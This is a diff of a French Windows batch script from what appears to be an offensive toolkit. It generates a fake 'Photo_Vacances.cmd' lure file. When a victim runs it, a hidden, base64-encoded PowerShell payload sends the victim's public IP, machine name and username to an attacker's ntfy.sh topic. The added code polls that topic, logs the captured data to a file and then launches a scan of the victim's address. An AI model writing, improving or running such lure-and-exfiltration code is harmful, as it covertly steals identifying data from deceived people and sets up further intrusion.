@@ -1905,35 +1905,93 @@ echo  ================================================
 echo   [NOTIF] PIEGE NTFY.SH - NOTIFICATION INSTANTANEE
 echo  ================================================
 echo.
-echo  [i] Genere un fichier Photo_Vacances.cmd sur le Bureau.
-echo      Quand votre cible l'execute, vous recevez une notif
-echo      avec son IP, nom de machine et session.
+echo  [i] Genere Photo_Vacances.cmd sur le Bureau.
+echo      Quand la cible l'execute, son IP arrive ici
+echo      automatiquement et le scan se lance.
 echo.
 echo  [i] Choisissez un topic unique (ex: alex-trap-7842)
-echo      Puis ouvrez https://ntfy.sh/VOTRE-TOPIC dans votre
-echo      navigateur ou l'app ntfy (Android/iOS) pour recevoir.
 echo.
 call :InputWithEsc "Votre topic ntfy.sh : " grab_email
 if errorlevel 1 goto gm_traps_menu
 if not defined grab_email goto gm_traps_menu
 set "PS_EM=%TEMP%\ig_em_%RANDOM%.ps1"
+set "PS_NTFY=%TEMP%\ntfy_wait_%RANDOM%.ps1"
+set "CAPFILE_EM=%TEMP%\captured_ntfy.txt"
+set "IPDIST=%~dp0ip distant.txt"
 set "gemail=!grab_email!"
+REM --- Generation du CMD piege ---
 >> "%PS_EM%" echo $cmdPath = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
 >> "%PS_EM%" echo $ntfy = 'https://ntfy.sh/%gemail%'
->> "%PS_EM%" echo $psp = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$msg='IP: '+`$ip+' | PC: '+`$env:COMPUTERNAME+' | User: '+`$env:USERNAME; `$h=@{Title='Cible Identifiee';Priority='high';Tags='warning'}; Invoke-RestMethod -Uri '$ntfy' -Method Post -Body `$msg -Headers `$h -UseBasicParsing } catch {}"
+>> "%PS_EM%" echo $psp = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$msg='IP: '+`$ip+' ^| PC: '+`$env:COMPUTERNAME+' ^| User: '+`$env:USERNAME; `$h=@{Title='Cible Identifiee';Priority='high';Tags='warning'}; Invoke-RestMethod -Uri '$ntfy' -Method Post -Body `$msg -Headers `$h -UseBasicParsing } catch {}"
 >> "%PS_EM%" echo $bytes = [System.Text.Encoding]::Unicode.GetBytes($psp)
 >> "%PS_EM%" echo $b64 = [Convert]::ToBase64String($bytes)
 >> "%PS_EM%" echo $lines = @('@echo off', '', "start /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64", '', 'exit')
 >> "%PS_EM%" echo Set-Content -Path $cmdPath -Value $lines -Encoding ASCII
->> "%PS_EM%" echo Write-Host '  [OK] Piege : Photo_Vacances.cmd sur le Bureau' -f Green
->> "%PS_EM%" echo Write-Host "  [i] Notif vers : https://ntfy.sh/%gemail%" -f Cyan
->> "%PS_EM%" echo Write-Host '  [i] Ouvrez ce lien dans votre navigateur pour recevoir.' -f Yellow
->> "%PS_EM%" echo Write-Host '  [i] Quand vous recevez l''IP, revenez et choisissez [MANUEL].' -f Yellow
+>> "%PS_EM%" echo Write-Host '  [OK] Photo_Vacances.cmd genere sur le Bureau' -f Green
+>> "%PS_EM%" echo Write-Host "  [i] Topic : https://ntfy.sh/%gemail%" -f Cyan
 powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_EM%"
 if exist "%PS_EM%" del /f /q "%PS_EM%"
 start "" "https://ntfy.sh/!gemail!"
-echo.
-pause >nul
+REM --- Attente reception ntfy.sh + sauvegarde ip distant.txt ---
+>> "%PS_NTFY%" echo $Host.UI.RawUI.FlushInputBuffer()
+>> "%PS_NTFY%" echo $topic = '%gemail%'
+>> "%PS_NTFY%" echo $capFile = '%CAPFILE_EM%'
+>> "%PS_NTFY%" echo $logFile = '%IPDIST%'
+>> "%PS_NTFY%" echo $since = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+>> "%PS_NTFY%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
+>> "%PS_NTFY%" echo Write-Host '  [i] En attente de la cible... (ECHAP pour annuler)' -f DarkYellow
+>> "%PS_NTFY%" echo Write-Host ''
+>> "%PS_NTFY%" echo while (-not $esc -and -not $found) {
+>> "%PS_NTFY%" echo   if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_NTFY%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_NTFY%" echo   }
+>> "%PS_NTFY%" echo   try {
+>> "%PS_NTFY%" echo     $r = Invoke-WebRequest "https://ntfy.sh/$topic/json?poll=1&since=$since" -UseBasicParsing -TimeoutSec 5 -EA Stop
+>> "%PS_NTFY%" echo     $msgs = ($r.Content -split "`n") ^| Where-Object { $_ -match '"event":"message"' }
+>> "%PS_NTFY%" echo     foreach ($m in $msgs) {
+>> "%PS_NTFY%" echo       $obj = $m ^| ConvertFrom-Json
+>> "%PS_NTFY%" echo       if ($obj.message -match 'IP: ([^\|]+) \| PC: ([^\|]+) \| User: (.+)') {
+>> "%PS_NTFY%" echo         $ip_val=$matches[1].Trim(); $pc_val=$matches[2].Trim(); $usr_val=$matches[3].Trim()
+>> "%PS_NTFY%" echo         $found = $true
+>> "%PS_NTFY%" echo         Write-Host ''
+>> "%PS_NTFY%" echo         Write-Host '  =================================================' -f Red
+>> "%PS_NTFY%" echo         Write-Host ("  IP   : " + $ip_val) -f Cyan
+>> "%PS_NTFY%" echo         Write-Host ("  PC   : " + $pc_val) -f White
+>> "%PS_NTFY%" echo         Write-Host ("  User : " + $usr_val) -f White
+>> "%PS_NTFY%" echo         Write-Host '  =================================================' -f Red
+>> "%PS_NTFY%" echo         $ts = Get-Date -Format '[dd/MM/yyyy  H:mm:ss,ff]'
+>> "%PS_NTFY%" echo         Add-Content $logFile ("$ts [NTFY] IP: $ip_val -- PC: $pc_val -- User: $usr_val ") -Encoding UTF8
+>> "%PS_NTFY%" echo         Set-Content $capFile -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII
+>> "%PS_NTFY%" echo         Write-Host '  [->] Sauvegarde dans ip distant.txt' -f Green
+>> "%PS_NTFY%" echo         break
+>> "%PS_NTFY%" echo       }
+>> "%PS_NTFY%" echo     }
+>> "%PS_NTFY%" echo   } catch {}
+>> "%PS_NTFY%" echo   if (-not $found) {
+>> "%PS_NTFY%" echo     $i = 3
+>> "%PS_NTFY%" echo     while ($i -gt 0) {
+>> "%PS_NTFY%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
+>> "%PS_NTFY%" echo       $si++; $i--; Start-Sleep -Milliseconds 1000
+>> "%PS_NTFY%" echo       if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_NTFY%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_NTFY%" echo       }
+>> "%PS_NTFY%" echo     }
+>> "%PS_NTFY%" echo   }
+>> "%PS_NTFY%" echo }
+>> "%PS_NTFY%" echo if ($found) { Write-Host '  [->] Lancement du scan...' -f Green }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_NTFY%"
+if exist "%PS_NTFY%" del /f /q "%PS_NTFY%"
+if exist "%CAPFILE_EM%" (
+    set /p cap_em=<"%CAPFILE_EM%"
+    for /f "tokens=1 delims=;" %%a in ("!cap_em!") do set "remote_ip=%%a"
+    for /f "tokens=2 delims=;" %%b in ("!cap_em!") do set "remote_pc=%%b"
+    del /f /q "%CAPFILE_EM%"
+    if defined remote_ip (
+        chcp 65001 >nul
+        timeout /t 2 >nul
+        goto wan_public_scan
+    )
+)
 goto gm_traps_menu
 
 REM --- [5] Saisie Manuelle ---
